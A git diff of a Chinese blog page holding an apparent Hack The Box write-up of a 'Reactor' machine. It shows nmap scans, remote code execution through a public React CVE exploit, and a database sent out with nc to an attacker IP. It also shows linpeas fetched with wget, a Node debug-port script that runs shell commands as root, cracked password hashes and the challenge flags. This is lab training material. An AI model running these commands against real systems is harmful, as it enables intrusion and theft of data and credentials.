@@ -26,26 +26,26 @@
 <meta property="og:site_name" content="Colourful">
 <meta property="og:description" content="信息收集先用nmap扫描 1nmap -A 10.129.1.23   但是什么都没有扫出来，其实可以用Tscan扫，扫到22和3000，然后用另一个更详细精准的命令进行验证 1nmap -sV -sC -p22,3000 --min-rate&#x3D;1000 10.129.1.23 -vv -Pn   这里可以发现有两个端口，常见的22端口是一个ssh服务，然后尝试去访问3000端口  CVE-202">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015915874.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015918627.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015921138.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015923238.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015925736.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015928989.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015933032.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015935477.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015937575.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015939658.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015941692.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015943782.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015947741.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020105684.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020539913.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020542884.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020545623.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020549771.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020554661.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020603000.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020606630.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020611218.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020616148.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020621962.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020627970.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020633122.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020637371.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020642508.png">
 <meta property="article:published_time" content="2026-06-09T17:58:17.000Z">
-<meta property="article:modified_time" content="2026-06-09T18:01:06.711Z">
+<meta property="article:modified_time" content="2026-06-09T18:06:44.195Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610015915874.png">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/06/10/Reactor/image-20260610020539913.png">
 <meta name="twitter:creator" content="@Colorful">
   
   
@@ -434,7 +434,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-06-10T02:01:06+08:00
+                    本文最后更新于 2026-06-10T02:06:44+08:00
                   
                   
 
@@ -447,18 +447,18 @@
                 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>先用nmap扫描</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 10.129.1.23<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/10/Reactor/image-20260610015915874.png" srcset="/img/loading.gif" lazyload alt="image-20260610015915874"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020539913.png" srcset="/img/loading.gif" lazyload alt="image-20260610020539913"></p>
 <p>但是什么都没有扫出来，其实可以用Tscan扫，扫到22和3000，然后用另一个更详细精准的命令进行验证</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -sC -p22,3000 --min-rate=1000 10.129.1.23 -vv -Pn<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/10/Reactor/image-20260610015918627.png" srcset="/img/loading.gif" lazyload alt="image-20260610015918627"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020542884.png" srcset="/img/loading.gif" lazyload alt="image-20260610020542884"></p>
 <p>这里可以发现有两个端口，常见的22端口是一个ssh服务，然后尝试去访问3000端口</p>
-<p><img src="/2026/06/10/Reactor/image-20260610015921138.png" srcset="/img/loading.gif" lazyload alt="image-20260610015921138"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020545623.png" srcset="/img/loading.gif" lazyload alt="image-20260610020545623"></p>
 <h1 id="CVE-2025-55182"><a href="#CVE-2025-55182" class="headerlink" title="CVE-2025-55182"></a>CVE-2025-55182</h1><p>利用Wappalyzer插件探测到存在React框架，就去搜索这个框架相关的漏洞</p>
 <blockquote>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://github.com/ThemeHackers/CVE-2025-55182">https://github.com/ThemeHackers/CVE-2025-55182</a></p>
 </blockquote>
-<p><img src="/2026/06/10/Reactor/image-20260610015923238.png" srcset="/img/loading.gif" lazyload alt="image-20260610015923238"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020549771.png" srcset="/img/loading.gif" lazyload alt="image-20260610020549771"></p>
 <p>利用步骤</p>
 <p>将github中的文件下载到本地解压缩后将文件上传到kali，搭建一个虚拟环境进行操作</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m venv venv<br><span class="hljs-built_in">source</span> venv/bin/activate<br>pip install -r requirements.txt<br></code></pre></td></tr></table></figure>
@@ -468,42 +468,42 @@
 
 <p>就可以进行rce</p>
 <p>先查看id还是node身份，因此下一步就要进行一个提权</p>
-<p><img src="/2026/06/10/Reactor/image-20260610015925736.png" srcset="/img/loading.gif" lazyload alt="image-20260610015925736"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020554661.png" srcset="/img/loading.gif" lazyload alt="image-20260610020554661"></p>
 <p>ls查看文件，发现了react.db，就需要把这个文件传输到自己的kali</p>
-<p><img src="/2026/06/10/Reactor/image-20260610015928989.png" srcset="/img/loading.gif" lazyload alt="image-20260610015928989"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020603000.png" srcset="/img/loading.gif" lazyload alt="image-20260610020603000"></p>
 <p>先重新开一个终端在此监听8888端口，把对方发过来的所有数据保存成一个叫 <code>reactor.db</code>的文件</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">8888</span> &gt; reactor.db<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/10/Reactor/image-20260610015933032.png" srcset="/img/loading.gif" lazyload alt="image-20260610015933032"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020606630.png" srcset="/img/loading.gif" lazyload alt="image-20260610020606630"></p>
 <p>然后在刚刚拿到shell的地方传输文件</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -q <span class="hljs-number">0</span> <span class="hljs-number">10.10.16.23</span> <span class="hljs-number">8888</span> &lt; reactor.db<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/10/Reactor/image-20260610015935477.png" srcset="/img/loading.gif" lazyload alt="image-20260610015935477"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020611218.png" srcset="/img/loading.gif" lazyload alt="image-20260610020611218"></p>
 <p>然后需要等一会再去查看得到reactor.db文件，发现可以看到数据库</p>
-<p><img src="/2026/06/10/Reactor/image-20260610015937575.png" srcset="/img/loading.gif" lazyload alt="image-20260610015937575"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020616148.png" srcset="/img/loading.gif" lazyload alt="image-20260610020616148"></p>
 <p>点击“浏览数据”，查看数据库中的内容，在“users”表中看到了两个用户和他们的hash加密的密码</p>
-<p><img src="/2026/06/10/Reactor/image-20260610015939658.png" srcset="/img/loading.gif" lazyload alt="image-20260610015939658"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020621962.png" srcset="/img/loading.gif" lazyload alt="image-20260610020621962"></p>
 <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">admin	a203b22191d744a4e70ada5c101b17b8	administrator	admin<span class="hljs-meta">@reactor</span>.htb<br>engineer	39d97110eafe2a9a68639812cd271e8e	<span class="hljs-keyword">operator</span>	engineer<span class="hljs-meta">@reactor</span>.htb<br></code></pre></td></tr></table></figure>
 
 <p>用小工具破解一下</p>
 <blockquote>
 <p>破解工具：<a target="_blank" rel="noopener" href="https://www.cmd5.com/default.aspx">https://www.cmd5.com/default.aspx</a></p>
 </blockquote>
-<p><img src="/2026/06/10/Reactor/image-20260610015941692.png" srcset="/img/loading.gif" lazyload alt="image-20260610015941692"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020627970.png" srcset="/img/loading.gif" lazyload alt="image-20260610020627970"></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>得到enginer的密码reactor1，尝试sudo提权</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.16.23/linpeas.sh<br><span class="hljs-built_in">chmod</span> +x linpeas.sh<br>./linpeas.sh<br></code></pre></td></tr></table></figure>
 
 <p>但是提权失败了，可以查看后台进程</p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">ps aux | grep <span class="hljs-keyword">node</span> <span class="hljs-title"></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/10/Reactor/image-20260610015943782.png" srcset="/img/loading.gif" lazyload alt="image-20260610015943782"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020633122.png" srcset="/img/loading.gif" lazyload alt="image-20260610020633122"></p>
 <p>发现了本地9229开启的node调试端口，就可以利用node调试器提权</p>
 <p>先用curl查看json</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://127.0.0.1:9229/json<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">7422b351</span>-76bd-480e-ab3a-<span class="hljs-number">034a578084d1</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/06/10/Reactor/image-20260610015947741.png" srcset="/img/loading.gif" lazyload alt="image-20260610015947741"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020637371.png" srcset="/img/loading.gif" lazyload alt="image-20260610020637371"></p>
 <p>利用ws链接调试端口</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">WebSocket</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ws&#x27;</span>);<br><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;ws://127.0.0.1:9229/7422b351-76bd-480e-ab3a-034a578084d1&#x27;</span>); <span class="hljs-comment">//改成你自己的</span><br><br>ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;connected&#x27;</span>);<br><br>    <span class="hljs-comment">// 执行 JS</span><br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>        <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;Runtime.evaluate&quot;</span>,<br>        <span class="hljs-attr">params</span>: &#123;<br>            <span class="hljs-attr">expression</span>: <span class="hljs-string">`</span><br><span class="hljs-string">                this.constructor.constructor(&#x27;return process&#x27;)()</span><br><span class="hljs-string">                .mainModule.require(&#x27;child_process&#x27;)</span><br><span class="hljs-string">                .execSync(&#x27;id&#x27;) //命令执行处，可以改为ls等等</span><br><span class="hljs-string">                .toString()</span><br><span class="hljs-string">            `</span><br>        &#125;<br>    &#125;));<br>&#125;);<br><br>ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-title function_">toString</span>());<br>&#125;);<br><br></code></pre></td></tr></table></figure>
 
@@ -511,7 +511,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -L 9229:127.0.0.1:9229 engineer@10.129.1.23 -fN <br><br>node nodejs_debug_port_RCE.js<br></code></pre></td></tr></table></figure>
 
 <p>提权成功</p>
-<p><img src="/2026/06/10/Reactor/image-20260610020105684.png" srcset="/img/loading.gif" lazyload alt="image-20260610020105684"></p>
+<p><img src="/2026/06/10/Reactor/image-20260610020642508.png" srcset="/img/loading.gif" lazyload alt="image-20260610020642508"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /home/engineer/user.txt<br><br>02ed28626cf21cf1a1464cbf0bbef209<br><br><span class="hljs-built_in">cat</span> /root/root.txt<br><br>859daa9ef9665449c699598ab5195eda<br></code></pre></td></tr></table></figure>
 
 <p>然后就是进行rce执行任意代码了</p>
